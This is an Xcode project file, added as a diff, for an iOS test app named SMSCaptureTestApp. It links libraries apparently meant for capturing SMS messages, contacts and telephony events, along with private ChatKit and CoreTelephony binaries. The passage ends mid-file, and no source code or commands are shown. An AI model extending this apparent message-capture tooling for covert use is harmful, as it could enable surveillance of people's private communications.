@@ -1,0 +1,780 @@
+// !$*UTF8*$!
+{
+	archiveVersion = 1;
+	classes = {
+	};
+	objectVersion = 45;
+	objects = {
+
+/* Begin PBXBuildFile section */
+		1D60589B0D05DD56006BFB54 /* main.m in Sources */ = {isa = PBXBuildFile; fileRef = 29B97316FDCFA39411CA2CEA /* main.m */; };
+		1D60589F0D05DD5A006BFB54 /* Foundation.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 1D30AB110D05D00D00671497 /* Foundation.framework */; };
+		1DF5F4E00D08C38300B7A737 /* UIKit.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 1DF5F4DF0D08C38300B7A737 /* UIKit.framework */; };
+		288765A50DF7441C002DB57D /* CoreGraphics.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 288765A40DF7441C002DB57D /* CoreGraphics.framework */; };
+		351800891D65C6F10090B314 /* libsqlite3.0.tbd in Frameworks */ = {isa = PBXBuildFile; fileRef = 351800881D65C6F10090B314 /* libsqlite3.0.tbd */; };
+		3518008B1D65C7070090B314 /* ChatKit in Frameworks */ = {isa = PBXBuildFile; fileRef = 3518008A1D65C7070090B314 /* ChatKit */; };
+		351800A21D65C8E70090B314 /* CoreTelephony in Frameworks */ = {isa = PBXBuildFile; fileRef = 351800A11D65C8E70090B314 /* CoreTelephony */; };
+		35F8B20416C4A53B0039DD3A /* libIPC.a in Frameworks */ = {isa = PBXBuildFile; fileRef = 35F8B20316C4A5360039DD3A /* libIPC.a */; };
+		ED0E4159148382180027DB69 /* libSMSCaptureManager.a in Frameworks */ = {isa = PBXBuildFile; fileRef = ED0E41581483820E0027DB69 /* libSMSCaptureManager.a */; };
+		ED9D2A881487ACF10012E5D4 /* libABContactsManager.a in Frameworks */ = {isa = PBXBuildFile; fileRef = ED9D2A801487ACE70012E5D4 /* libABContactsManager.a */; };
+		EDCE032A1485CDD3004D4053 /* libTelephonyNotification.a in Frameworks */ = {isa = PBXBuildFile; fileRef = EDCE03171485CD75004D4053 /* libTelephonyNotification.a */; };
+		EDCE032B1485CDD9004D4053 /* libFxEvents.a in Frameworks */ = {isa = PBXBuildFile; fileRef = EDCE03111485CD57004D4053 /* libFxEvents.a */; };
+		EDCE032C1485CDDF004D4053 /* libEventCenter.a in Frameworks */ = {isa = PBXBuildFile; fileRef = EDCE03081485CD40004D4053 /* libEventCenter.a */; };
+		EDCE035A1485CEA9004D4053 /* libFxStd.a in Frameworks */ = {isa = PBXBuildFile; fileRef = EDCE031D1485CD92004D4053 /* libFxStd.a */; };
+		EDCE037D1485CF48004D4053 /* libFMDB.a in Frameworks */ = {isa = PBXBuildFile; fileRef = EDCE034B1485CE7B004D4053 /* libFMDB.a */; };
+/* End PBXBuildFile section */
+
+/* Begin PBXContainerItemProxy section */
+		3518005D1D65C6870090B314 /* PBXContainerItemProxy */ = {
+			isa = PBXContainerItemProxy;
+			containerPortal = EDCE03001485CD40004D4053 /* EventCenter.xcodeproj */;
+			proxyType = 2;
+			remoteGlobalIDString = 0819FA3317F9340300DDE835;
+			remoteInfo = EventCenterMac;
+		};
+		351800611D65C6870090B314 /* PBXContainerItemProxy */ = {
+			isa = PBXContainerItemProxy;
+			containerPortal = EDCE03401485CE7B004D4053 /* fmdb.xcodeproj */;
+			proxyType = 2;
+			remoteGlobalIDString = 08A4D04B18029C15004A2589;
+			remoteInfo = FMDBMac;
+		};
+		351800641D65C6870090B314 /* PBXContainerItemProxy */ = {
+			isa = PBXContainerItemProxy;
+			containerPortal = EDCE03091485CD57004D4053 /* FxEvents.xcodeproj */;
+			proxyType = 2;
+			remoteGlobalIDString = 08629AF417F957080085D580;
+			remoteInfo = FxEventsMac;
+		};
+		351800681D65C6870090B314 /* PBXContainerItemProxy */ = {
+			isa = PBXContainerItemProxy;
+			containerPortal = EDCE03181485CD92004D4053 /* FxStd.xcodeproj */;
+			proxyType = 2;
+			remoteGlobalIDString = FCBD2F8C1BABEF5A0061109F;
+			remoteInfo = "FxStd-E";
+		};
+		3518006A1D65C6870090B314 /* PBXContainerItemProxy */ = {
+			isa = PBXContainerItemProxy;
+			containerPortal = EDCE03181485CD92004D4053 /* FxStd.xcodeproj */;
+			proxyType = 2;
+			remoteGlobalIDString = 0885379A17F98FC900AB08F2;
+			remoteInfo = FxStdMac;
+		};
+		3518006E1D65C6870090B314 /* PBXContainerItemProxy */ = {
+			isa = PBXContainerItemProxy;
+			containerPortal = 35F8B1FE16C4A5360039DD3A /* IPC.xcodeproj */;
+			proxyType = 2;
+			remoteGlobalIDString = FC1D15E11BAAD607006E504B;
+			remoteInfo = "IPC-E";
+		};
+		351800701D65C6870090B314 /* PBXContainerItemProxy */ = {
+			isa = PBXContainerItemProxy;
+			containerPortal = 35F8B1FE16C4A5360039DD3A /* IPC.xcodeproj */;
+			proxyType = 2;
+			remoteGlobalIDString = 086B114117FA732900D21FD5;
+			remoteInfo = IPCMac;
+		};
+		351800731D65C6870090B314 /* PBXContainerItemProxy */ = {
+			isa = PBXContainerItemProxy;
+			containerPortal = ED0E413B1483820E0027DB69 /* SMSCaptureManager.xcodeproj */;
+			proxyType = 2;
+			remoteGlobalIDString = FCDE796D1B93FA9D00C365E7;
+			remoteInfo = "SMSCaptureManager-E";
+		};
+		35F8B12A16C4A4E50039DD3A /* PBXContainerItemProxy */ = {
+			isa = PBXContainerItemProxy;
+			containerPortal = EDCE03091485CD57004D4053 /* FxEvents.xcodeproj */;
+			proxyType = 1;
+			remoteGlobalIDString = D2AAC07D0554694100DB518D;
+			remoteInfo = FxEvents;
+		};
+		35F8B12C16C4A4EA0039DD3A /* PBXContainerItemProxy */ = {
+			isa = PBXContainerItemProxy;
+			containerPortal = EDCE03181485CD92004D4053 /* FxStd.xcodeproj */;
+			proxyType = 1;
+			remoteGlobalIDString = D2AAC07D0554694100DB518D;
+			remoteInfo = FxStd;
+		};
+		35F8B12E16C4A4ED0039DD3A /* PBXContainerItemProxy */ = {
+			isa = PBXContainerItemProxy;
+			containerPortal = ED9D2A781487ACE70012E5D4 /* ABContactsManager.xcodeproj */;
+			proxyType = 1;
+			remoteGlobalIDString = D2AAC07D0554694100DB518D;
+			remoteInfo = ABContactsManager;
+		};
+		35F8B13016C4A4F00039DD3A /* PBXContainerItemProxy */ = {
+			isa = PBXContainerItemProxy;
+			containerPortal = EDCE03401485CE7B004D4053 /* fmdb.xcodeproj */;
+			proxyType = 1;
+			remoteGlobalIDString = EE4290EE12B42F870088BD94;
+			remoteInfo = FMDB;
+		};
+		35F8B13216C4A4F30039DD3A /* PBXContainerItemProxy */ = {
+			isa = PBXContainerItemProxy;
+			containerPortal = EDCE03001485CD40004D4053 /* EventCenter.xcodeproj */;
+			proxyType = 1;
+			remoteGlobalIDString = D2AAC07D0554694100DB518D;
+			remoteInfo = EventCenter;
+		};
+		35F8B13416C4A4F60039DD3A /* PBXContainerItemProxy */ = {
+			isa = PBXContainerItemProxy;
+			containerPortal = EDCE03121485CD75004D4053 /* TelephonyNotification.xcodeproj */;
+			proxyType = 1;
+			remoteGlobalIDString = D2AAC07D0554694100DB518D;
+			remoteInfo = TelephonyNotification;
+		};
+		35F8B13616C4A4F80039DD3A /* PBXContainerItemProxy */ = {
+			isa = PBXContainerItemProxy;
+			containerPortal = ED0E413B1483820E0027DB69 /* SMSCaptureManager.xcodeproj */;
+			proxyType = 1;
+			remoteGlobalIDString = D2AAC07D0554694100DB518D;
+			remoteInfo = SMSCaptureManager;
+		};
+		35F8B20216C4A5360039DD3A /* PBXContainerItemProxy */ = {
+			isa = PBXContainerItemProxy;
+			containerPortal = 35F8B1FE16C4A5360039DD3A /* IPC.xcodeproj */;
+			proxyType = 2;
+			remoteGlobalIDString = D2AAC07E0554694100DB518D;
+			remoteInfo = IPC;
+		};
+		35F8B20516C4A5490039DD3A /* PBXContainerItemProxy */ = {
+			isa = PBXContainerItemProxy;
+			containerPortal = 35F8B1FE16C4A5360039DD3A /* IPC.xcodeproj */;
+			proxyType = 1;
+			remoteGlobalIDString = D2AAC07D0554694100DB518D;
+			remoteInfo = IPC;
+		};
+		ED0E41571483820E0027DB69 /* PBXContainerItemProxy */ = {
+			isa = PBXContainerItemProxy;
+			containerPortal = ED0E413B1483820E0027DB69 /* SMSCaptureManager.xcodeproj */;
+			proxyType = 2;
+			remoteGlobalIDString = D2AAC07E0554694100DB518D;
+			remoteInfo = SMSCaptureManager;
+		};
+		ED9D2A7F1487ACE70012E5D4 /* PBXContainerItemProxy */ = {
+			isa = PBXContainerItemProxy;
+			containerPortal = ED9D2A781487ACE70012E5D4 /* ABContactsManager.xcodeproj */;
+			proxyType = 2;
+			remoteGlobalIDString = D2AAC07E0554694100DB518D;
+			remoteInfo = ABContactsManager;
+		};
+		EDCE03071485CD40004D4053 /* PBXContainerItemProxy */ = {
+			isa = PBXContainerItemProxy;
+			containerPortal = EDCE03001485CD40004D4053 /* EventCenter.xcodeproj */;
+			proxyType = 2;
+			remoteGlobalIDString = D2AAC07E0554694100DB518D;
+			remoteInfo = EventCenter;
+		};
+		EDCE03101485CD57004D4053 /* PBXContainerItemProxy */ = {
+			isa = PBXContainerItemProxy;
+			containerPortal = EDCE03091485CD57004D4053 /* FxEvents.xcodeproj */;
+			proxyType = 2;
+			remoteGlobalIDString = D2AAC07E0554694100DB518D;
+			remoteInfo = FxEvents;
+		};
+		EDCE03161485CD75004D4053 /* PBXContainerItemProxy */ = {
+			isa = PBXContainerItemProxy;
+			containerPortal = EDCE03121485CD75004D4053 /* TelephonyNotification.xcodeproj */;
+			proxyType = 2;
+			remoteGlobalIDString = D2AAC07E0554694100DB518D;
+			remoteInfo = TelephonyNotification;
+		};
+		EDCE031C1485CD92004D4053 /* PBXContainerItemProxy */ = {
+			isa = PBXContainerItemProxy;
+			containerPortal = EDCE03181485CD92004D4053 /* FxStd.xcodeproj */;
+			proxyType = 2;
+			remoteGlobalIDString = D2AAC07E0554694100DB518D;
+			remoteInfo = FxStd;
+		};
+		EDCE03481485CE7B004D4053 /* PBXContainerItemProxy */ = {
+			isa = PBXContainerItemProxy;
+			containerPortal = EDCE03401485CE7B004D4053 /* fmdb.xcodeproj */;
+			proxyType = 2;
+			remoteGlobalIDString = 8DD76FA10486AA7600D96B5E;
+			remoteInfo = fmdb;
+		};
+		EDCE034A1485CE7B004D4053 /* PBXContainerItemProxy */ = {
+			isa = PBXContainerItemProxy;
+			containerPortal = EDCE03401485CE7B004D4053 /* fmdb.xcodeproj */;
+			proxyType = 2;
+			remoteGlobalIDString = EE4290EF12B42F870088BD94;
+			remoteInfo = FMDB;
+		};
+/* End PBXContainerItemProxy section */
+
+/* Begin PBXFileReference section */
+		1D30AB110D05D00D00671497 /* Foundation.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = Foundation.framework; path = System/Library/Frameworks/Foundation.framework; sourceTree = SDKROOT; };
+		1D6058910D05DD3D006BFB54 /* SMSCaptureTestApp.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = SMSCaptureTestApp.app; sourceTree = BUILT_PRODUCTS_DIR; };
+		1DF5F4DF0D08C38300B7A737 /* UIKit.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = UIKit.framework; path = System/Library/Frameworks/UIKit.framework; sourceTree = SDKROOT; };
+		288765A40DF7441C002DB57D /* CoreGraphics.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = CoreGraphics.framework; path = System/Library/Frameworks/CoreGraphics.framework; sourceTree = SDKROOT; };
+		29B97316FDCFA39411CA2CEA /* main.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = main.m; sourceTree = "<group>"; };
+		32CA4F630368D1EE00C91783 /* SMSCaptureTestApp_Prefix.pch */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = SMSCaptureTestApp_Prefix.pch; sourceTree = "<group>"; };
+		351800881D65C6F10090B314 /* libsqlite3.0.tbd */ = {isa = PBXFileReference; lastKnownFileType = "sourcecode.text-based-dylib-definition"; name = libsqlite3.0.tbd; path = usr/lib/libsqlite3.0.tbd; sourceTree = SDKROOT; };
+		3518008A1D65C7070090B314 /* ChatKit */ = {isa = PBXFileReference; lastKnownFileType = "compiled.mach-o.dylib"; name = ChatKit; path = ../../OTC/Frameworks/iOS7/ChatKit.framework/ChatKit; sourceTree = "<group>"; };
+		351800A11D65C8E70090B314 /* CoreTelephony */ = {isa = PBXFileReference; lastKnownFileType = "compiled.mach-o.dylib"; name = CoreTelephony; path = ../../OTC/Frameworks/iOS7/CoreTelephony.framework/CoreTelephony; sourceTree = "<group>"; };
+		35F8B1FE16C4A5360039DD3A /* IPC.xcodeproj */ = {isa = PBXFileReference; lastKnownFileType = "wrapper.pb-project"; name = IPC.xcodeproj; path = "../../IPC/Source-IPC/IPC.xcodeproj"; sourceTree = SOURCE_ROOT; };
+		8D1107310486CEB800E47090 /* SMSCaptureTestApp-Info.plist */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text.plist.xml; path = "SMSCaptureTestApp-Info.plist"; plistStructureDefinitionIdentifier = "com.apple.xcode.plist.structure-definition.iphone.info-plist"; sourceTree = "<group>"; };
+		ED0E413B1483820E0027DB69 /* SMSCaptureManager.xcodeproj */ = {isa = PBXFileReference; lastKnownFileType = "wrapper.pb-project"; name = SMSCaptureManager.xcodeproj; path = "../Source-SMSCaptureManager/SMSCaptureManager.xcodeproj"; sourceTree = SOURCE_ROOT; };
+		ED9D2A781487ACE70012E5D4 /* ABContactsManager.xcodeproj */ = {isa = PBXFileReference; lastKnownFileType = "wrapper.pb-project"; name = ABContactsManager.xcodeproj; path = "../../ABContactsManager/Source-ABContactsManager/ABContactsManager.xcodeproj"; sourceTree = SOURCE_ROOT; };
+		EDC0BDEA14849735007A685D /* libsqlite3.dylib */ = {isa = PBXFileReference; lastKnownFileType = "compiled.mach-o.dylib"; name = libsqlite3.dylib; path = usr/lib/libsqlite3.dylib; sourceTree = SDKROOT; };
+		EDCE03001485CD40004D4053 /* EventCenter.xcodeproj */ = {isa = PBXFileReference; lastKnownFileType = "wrapper.pb-project"; name = EventCenter.xcodeproj; path = "../../EventCenter/Source-EventCenter/EventCenter.xcodeproj"; sourceTree = SOURCE_ROOT; };
+		EDCE03091485CD57004D4053 /* FxEvents.xcodeproj */ = {isa = PBXFileReference; lastKnownFileType = "wrapper.pb-project"; name = FxEvents.xcodeproj; path = ../../Events/FxEvents/FxEvents.xcodeproj; sourceTree = SOURCE_ROOT; };
+		EDCE03121485CD75004D4053 /* TelephonyNotification.xcodeproj */ = {isa = PBXFileReference; lastKnownFileType = "wrapper.pb-project"; name = TelephonyNotification.xcodeproj; path = "../../TelephonyNotification/Source-TelephonyNotification/TelephonyNotification.xcodeproj"; sourceTree = SOURCE_ROOT; };
+		EDCE03181485CD92004D4053 /* FxStd.xcodeproj */ = {isa = PBXFileReference; lastKnownFileType = "wrapper.pb-project"; name = FxStd.xcodeproj; path = ../../Std/FxStd/FxStd.xcodeproj; sourceTree = SOURCE_ROOT; };
+		EDCE03401485CE7B004D4053 /* fmdb.xcodeproj */ = {isa = PBXFileReference; lastKnownFileType = "wrapper.pb-project"; name = fmdb.xcodeproj; path = "../../ccgus-fmdb-606b29d/fmdb.xcodeproj"; sourceTree = SOURCE_ROOT; };
+/* End PBXFileReference section */
+
+/* Begin PBXFrameworksBuildPhase section */
+		1D60588F0D05DD3D006BFB54 /* Frameworks */ = {
+			isa = PBXFrameworksBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				35F8B20416C4A53B0039DD3A /* libIPC.a in Frameworks */,
+				ED9D2A881487ACF10012E5D4 /* libABContactsManager.a in Frameworks */,
+				ED0E4159148382180027DB69 /* libSMSCaptureManager.a in Frameworks */,
+				EDCE035A1485CEA9004D4053 /* libFxStd.a in Frameworks */,
+				EDCE037D1485CF48004D4053 /* libFMDB.a in Frameworks */,
+				EDCE032C1485CDDF004D4053 /* libEventCenter.a in Frameworks */,
+				EDCE032B1485CDD9004D4053 /* libFxEvents.a in Frameworks */,
+				EDCE032A1485CDD3004D4053 /* libTelephonyNotification.a in Frameworks */,
+				351800A21D65C8E70090B314 /* CoreTelephony in Frameworks */,
+				3518008B1D65C7070090B314 /* ChatKit in Frameworks */,
+				351800891D65C6F10090B314 /* libsqlite3.0.tbd in Frameworks */,
+				1D60589F0D05DD5A006BFB54 /* Foundation.framework in Frameworks */,
+				1DF5F4E00D08C38300B7A737 /* UIKit.framework in Frameworks */,
+				288765A50DF7441C002DB57D /* CoreGraphics.framework in Frameworks */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+/* End PBXFrameworksBuildPhase section */
+
+/* Begin PBXGroup section */
+		080E96DDFE201D6D7F000001 /* Classes */ = {
+			isa = PBXGroup;
+			children = (
+			);
+			path = Classes;
+			sourceTree = "<group>";
+		};
+		19C28FACFE9D520D11CA2CBB /* Products */ = {
+			isa = PBXGroup;
+			children = (
+				1D6058910D05DD3D006BFB54 /* SMSCaptureTestApp.app */,
+			);
+			name = Products;
+			sourceTree = "<group>";
+		};
+		29B97314FDCFA39411CA2CEA /* CustomTemplate */ = {
+			isa = PBXGroup;
+			children = (
+				35F8B1FE16C4A5360039DD3A /* IPC.xcodeproj */,
+				ED9D2A781487ACE70012E5D4 /* ABContactsManager.xcodeproj */,
+				EDCE03401485CE7B004D4053 /* fmdb.xcodeproj */,
+				EDCE03181485CD92004D4053 /* FxStd.xcodeproj */,
+				EDCE03121485CD75004D4053 /* TelephonyNotification.xcodeproj */,
+				EDCE03091485CD57004D4053 /* FxEvents.xcodeproj */,
+				EDCE03001485CD40004D4053 /* EventCenter.xcodeproj */,
+				ED0E413B1483820E0027DB69 /* SMSCaptureManager.xcodeproj */,
+				080E96DDFE201D6D7F000001 /* Classes */,
+				29B97315FDCFA39411CA2CEA /* Other Sources */,
+				29B97317FDCFA39411CA2CEA /* Resources */,
+				29B97323FDCFA39411CA2CEA /* Frameworks */,
+				19C28FACFE9D520D11CA2CBB /* Products */,
+				EDC0BDEA14849735007A685D /* libsqlite3.dylib */,
+			);
+			name = CustomTemplate;
+			sourceTree = "<group>";
+		};
+		29B97315FDCFA39411CA2CEA /* Other Sources */ = {
+			isa = PBXGroup;
+			children = (
+				32CA4F630368D1EE00C91783 /* SMSCaptureTestApp_Prefix.pch */,
+				29B97316FDCFA39411CA2CEA /* main.m */,
+			);
+			name = "Other Sources";
+			sourceTree = "<group>";
+		};
+		29B97317FDCFA39411CA2CEA /* Resources */ = {
+			isa = PBXGroup;
+			children = (
+				8D1107310486CEB800E47090 /* SMSCaptureTestApp-Info.plist */,
+			);
+			name = Resources;
+			sourceTree = "<group>";
+		};
+		29B97323FDCFA39411CA2CEA /* Frameworks */ = {
+			isa = PBXGroup;
+			children = (
+				351800A11D65C8E70090B314 /* CoreTelephony */,
+				3518008A1D65C7070090B314 /* ChatKit */,
+				351800881D65C6F10090B314 /* libsqlite3.0.tbd */,
+				1DF5F4DF0D08C38300B7A737 /* UIKit.framework */,
+				1D30AB110D05D00D00671497 /* Foundation.framework */,
+				288765A40DF7441C002DB57D /* CoreGraphics.framework */,
+			);
+			name = Frameworks;
+			sourceTree = "<group>";
+		};
+		35F8B1FF16C4A5360039DD3A /* Products */ = {
+			isa = PBXGroup;
+			children = (
+				35F8B20316C4A5360039DD3A /* libIPC.a */,
+				3518006F1D65C6870090B314 /* libIPC-E.a */,
+				351800711D65C6870090B314 /* libIPCMac.a */,
+			);
+			name = Products;
+			sourceTree = "<group>";
+		};
+		ED0E413C1483820E0027DB69 /* Products */ = {
+			isa = PBXGroup;
+			children = (
+				ED0E41581483820E0027DB69 /* libSMSCaptureManager.a */,
+				351800741D65C6870090B314 /* libSMSCaptureManager-E.a */,
+			);
+			name = Products;
+			sourceTree = "<group>";
+		};
+		ED9D2A791487ACE70012E5D4 /* Products */ = {
+			isa = PBXGroup;
+			children = (
+				ED9D2A801487ACE70012E5D4 /* libABContactsManager.a */,
+			);
+			name = Products;
+			sourceTree = "<group>";
+		};
+		EDCE03011485CD40004D4053 /* Products */ = {
+			isa = PBXGroup;
+			children = (
+				EDCE03081485CD40004D4053 /* libEventCenter.a */,
+				3518005E1D65C6870090B314 /* libEventCenterMac.a */,
+			);
+			name = Products;
+			sourceTree = "<group>";
+		};
+		EDCE030A1485CD57004D4053 /* Products */ = {
+			isa = PBXGroup;
+			children = (
+				EDCE03111485CD57004D4053 /* libFxEvents.a */,
+				351800651D65C6870090B314 /* libFxEventsMac.a */,
+			);
+			name = Products;
+			sourceTree = "<group>";
+		};
+		EDCE03131485CD75004D4053 /* Products */ = {
+			isa = PBXGroup;
+			children = (
+				EDCE03171485CD75004D4053 /* libTelephonyNotification.a */,
+			);
+			name = Products;
+			sourceTree = "<group>";
+		};
+		EDCE03191485CD92004D4053 /* Products */ = {
+			isa = PBXGroup;
+			children = (
+				EDCE031D1485CD92004D4053 /* libFxStd.a */,
+				351800691D65C6870090B314 /* libFxStd-E.a */,
+				3518006B1D65C6870090B314 /* libFxStdMac.a */,
+			);
+			name = Products;
+			sourceTree = "<group>";
+		};
+		EDCE03411485CE7B004D4053 /* Products */ = {
+			isa = PBXGroup;
+			children = (
+				EDCE03491485CE7B004D4053 /* fmdb */,
+				EDCE034B1485CE7B004D4053 /* libFMDB.a */,
+				351800621D65C6870090B314 /* libFMDBMac.a */,
+			);
+			name = Products;
+			sourceTree = "<group>";
+		};
+/* End PBXGroup section */
+
+/* Begin PBXNativeTarget section */
+		1D6058900D05DD3D006BFB54 /* SMSCaptureTestApp */ = {
+			isa = PBXNativeTarget;
+			buildConfigurationList = 1D6058960D05DD3E006BFB54 /* Build configuration list for PBXNativeTarget "SMSCaptureTestApp" */;
+			buildPhases = (
+				1D60588D0D05DD3D006BFB54 /* Resources */,
+				1D60588E0D05DD3D006BFB54 /* Sources */,
+				1D60588F0D05DD3D006BFB54 /* Frameworks */,
+				35F8B11416C4A3640039DD3A /* ShellScript */,
+			);
+			buildRules = (
+			);
+			dependencies = (
+				35F8B12B16C4A4E50039DD3A /* PBXTargetDependency */,
+				35F8B12D16C4A4EA0039DD3A /* PBXTargetDependency */,
+				35F8B12F16C4A4ED0039DD3A /* PBXTargetDependency */,
+				35F8B13116C4A4F00039DD3A /* PBXTargetDependency */,
+				35F8B13316C4A4F30039DD3A /* PBXTargetDependency */,
+				35F8B13516C4A4F60039DD3A /* PBXTargetDependency */,
+				35F8B13716C4A4F80039DD3A /* PBXTargetDependency */,
+				35F8B20616C4A5490039DD3A /* PBXTargetDependency */,
+			);
+			name = SMSCaptureTestApp;
+			productName = SMSCaptureTestApp;
+			productReference = 1D6058910D05DD3D006BFB54 /* SMSCaptureTestApp.app */;
+			productType = "com.apple.product-type.application";
+		};
+/* End PBXNativeTarget section */
+
+/* Begin PBXProject section */
+		29B97313FDCFA39411CA2CEA /* Project object */ = {
+			isa = PBXProject;
+			attributes = {
+			};
+			buildConfigurationList = C01FCF4E08A954540054247B /* Build configuration list for PBXProject "SMSCaptureTestApp" */;
+			compatibilityVersion = "Xcode 3.1";
+			developmentRegion = English;
+			hasScannedForEncodings = 1;
+			knownRegions = (
+				en,
+			);
+			mainGroup = 29B97314FDCFA39411CA2CEA /* CustomTemplate */;
+			projectDirPath = "";
+			projectReferences = (
+				{
+					ProductGroup = ED9D2A791487ACE70012E5D4 /* Products */;
+					ProjectRef = ED9D2A781487ACE70012E5D4 /* ABContactsManager.xcodeproj */;
+				},
+				{
+					ProductGroup = EDCE03011485CD40004D4053 /* Products */;
+					ProjectRef = EDCE03001485CD40004D4053 /* EventCenter.xcodeproj */;
+				},
+				{
+					ProductGroup = EDCE03411485CE7B004D4053 /* Products */;
+					ProjectRef = EDCE03401485CE7B004D4053 /* fmdb.xcodeproj */;
+				},
+				{
+					ProductGroup = EDCE030A1485CD57004D4053 /* Products */;
+					ProjectRef = EDCE03091485CD57004D4053 /* FxEvents.xcodeproj */;
+				},
+				{
+					ProductGroup = EDCE03191485CD92004D4053 /* Products */;
+					ProjectRef = EDCE03181485CD92004D4053 /* FxStd.xcodeproj */;
+				},
+				{
+					ProductGroup = 35F8B1FF16C4A5360039DD3A /* Products */;
+					ProjectRef = 35F8B1FE16C4A5360039DD3A /* IPC.xcodeproj */;
+				},
+				{
+					ProductGroup = ED0E413C1483820E0027DB69 /* Products */;
+					ProjectRef = ED0E413B1483820E0027DB69 /* SMSCaptureManager.xcodeproj */;
+				},
+				{
+					ProductGroup = EDCE03131485CD75004D4053 /* Products */;
+					ProjectRef = EDCE03121485CD75004D4053 /* TelephonyNotification.xcodeproj */;
+				},
+			);
+			projectRoot = "";
+			targets = (
+				1D6058900D05DD3D006BFB54 /* SMSCaptureTestApp */,
+			);
+		};
+/* End PBXProject section */
+
+/* Begin PBXReferenceProxy section */
+		3518005E1D65C6870090B314 /* libEventCenterMac.a */ = {
+			isa = PBXReferenceProxy;
+			fileType = archive.ar;
+			path = libEventCenterMac.a;
+			remoteRef = 3518005D1D65C6870090B314 /* PBXContainerItemProxy */;
+			sourceTree = BUILT_PRODUCTS_DIR;
+		};
+		351800621D65C6870090B314 /* libFMDBMac.a */ = {
+			isa = PBXReferenceProxy;
+			fileType = archive.ar;
+			path = libFMDBMac.a;
+			remoteRef = 351800611D65C6870090B314 /* PBXContainerItemProxy */;
+			sourceTree = BUILT_PRODUCTS_DIR;
+		};
+		351800651D65C6870090B314 /* libFxEventsMac.a */ = {
+			isa = PBXReferenceProxy;
+			fileType = archive.ar;
+			path = libFxEventsMac.a;
+			remoteRef = 351800641D65C6870090B314 /* PBXContainerItemProxy */;
+			sourceTree = BUILT_PRODUCTS_DIR;
+		};
+		351800691D65C6870090B314 /* libFxStd-E.a */ = {
+			isa = PBXReferenceProxy;
+			fileType = archive.ar;
+			path = "libFxStd-E.a";
+			remoteRef = 351800681D65C6870090B314 /* PBXContainerItemProxy */;
+			sourceTree = BUILT_PRODUCTS_DIR;
+		};
+		3518006B1D65C6870090B314 /* libFxStdMac.a */ = {
+			isa = PBXReferenceProxy;
+			fileType = archive.ar;
+			path = libFxStdMac.a;
+			remoteRef = 3518006A1D65C6870090B314 /* PBXContainerItemProxy */;
+			sourceTree = BUILT_PRODUCTS_DIR;
+		};
+		3518006F1D65C6870090B314 /* libIPC-E.a */ = {
+			isa = PBXReferenceProxy;
+			fileType = archive.ar;
+			path = "libIPC-E.a";
+			remoteRef = 3518006E1D65C6870090B314 /* PBXContainerItemProxy */;
+			sourceTree = BUILT_PRODUCTS_DIR;
+		};
+		351800711D65C6870090B314 /* libIPCMac.a */ = {
+			isa = PBXReferenceProxy;
+			fileType = archive.ar;
+			path = libIPCMac.a;
+			remoteRef = 351800701D65C6870090B314 /* PBXContainerItemProxy */;
+			sourceTree = BUILT_PRODUCTS_DIR;
+		};
+		351800741D65C6870090B314 /* libSMSCaptureManager-E.a */ = {
+			isa = PBXReferenceProxy;
+			fileType = archive.ar;
+			path = "libSMSCaptureManager-E.a";
+			remoteRef = 351800731D65C6870090B314 /* PBXContainerItemProxy */;
+			sourceTree = BUILT_PRODUCTS_DIR;
+		};
+		35F8B20316C4A5360039DD3A /* libIPC.a */ = {
+			isa = PBXReferenceProxy;
+			fileType = archive.ar;
+			path = libIPC.a;
+			remoteRef = 35F8B20216C4A5360039DD3A /* PBXContainerItemProxy */;
+			sourceTree = BUILT_PRODUCTS_DIR;
+		};
+		ED0E41581483820E0027DB69 /* libSMSCaptureManager.a */ = {
+			isa = PBXReferenceProxy;
+			fileType = archive.ar;
+			path = libSMSCaptureManager.a;
+			remoteRef = ED0E41571483820E0027DB69 /* PBXContainerItemProxy */;
+			sourceTree = BUILT_PRODUCTS_DIR;
+		};
+		ED9D2A801487ACE70012E5D4 /* libABContactsManager.a */ = {
+			isa = PBXReferenceProxy;
+			fileType = archive.ar;
+			path = libABContactsManager.a;
+			remoteRef = ED9D2A7F1487ACE70012E5D4 /* PBXContainerItemProxy */;
+			sourceTree = BUILT_PRODUCTS_DIR;
+		};
+		EDCE03081485CD40004D4053 /* libEventCenter.a */ = {
+			isa = PBXReferenceProxy;
+			fileType = archive.ar;
+			path = libEventCenter.a;
+			remoteRef = EDCE03071485CD40004D4053 /* PBXContainerItemProxy */;
+			sourceTree = BUILT_PRODUCTS_DIR;
+		};
+		EDCE03111485CD57004D4053 /* libFxEvents.a */ = {
+			isa = PBXReferenceProxy;
+			fileType = archive.ar;
+			path = libFxEvents.a;
+			remoteRef = EDCE03101485CD57004D4053 /* PBXContainerItemProxy */;
+			sourceTree = BUILT_PRODUCTS_DIR;
+		};
+		EDCE03171485CD75004D4053 /* libTelephonyNotification.a */ = {
+			isa = PBXReferenceProxy;
+			fileType = archive.ar;
+			path = libTelephonyNotification.a;
+			remoteRef = EDCE03161485CD75004D4053 /* PBXContainerItemProxy */;
+			sourceTree = BUILT_PRODUCTS_DIR;
+		};
+		EDCE031D1485CD92004D4053 /* libFxStd.a */ = {
+			isa = PBXReferenceProxy;
+			fileType = archive.ar;
+			path = libFxStd.a;
+			remoteRef = EDCE031C1485CD92004D4053 /* PBXContainerItemProxy */;
+			sourceTree = BUILT_PRODUCTS_DIR;
+		};
+		EDCE03491485CE7B004D4053 /* fmdb */ = {
+			isa = PBXReferenceProxy;
+			fileType = "compiled.mach-o.executable";
+			path = fmdb;
+			remoteRef = EDCE03481485CE7B004D4053 /* PBXContainerItemProxy */;
+			sourceTree = BUILT_PRODUCTS_DIR;
+		};
+		EDCE034B1485CE7B004D4053 /* libFMDB.a */ = {
+			isa = PBXReferenceProxy;
+			fileType = archive.ar;
+			path = libFMDB.a;
